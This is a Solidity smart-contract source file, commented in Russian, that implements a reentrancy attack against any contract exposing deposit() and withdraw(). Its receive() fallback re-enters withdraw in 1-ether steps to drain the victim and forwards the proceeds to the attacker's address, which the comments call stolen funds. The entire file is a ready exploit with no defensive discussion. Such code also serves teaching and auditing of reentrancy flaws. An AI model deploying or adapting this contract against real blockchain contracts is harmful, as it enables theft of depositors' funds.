// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVictim {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IVictim public victim;
    address public owner;

    constructor(address _victimAddress) {
        victim = IVictim(_victimAddress);
        owner = msg.sender;
    }

    // Функция для финансирования атакующего контракта
    function fund() external payable {}

    // Функция для запуска атаки
    function attack() external {
        require(msg.sender == owner, "Not the owner");
        uint256 initialBalance = address(this).balance;

        // Депозит средств в жертву
        victim.deposit{value: initialBalance}();

        // Начало атаки
        victim.withdraw(initialBalance);
    }

    // Функция fallback для повторного входа
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        } else {
            // Перевод украденных средств владельцу
            payable(owner).transfer(address(this).balance);
        }
    }
}
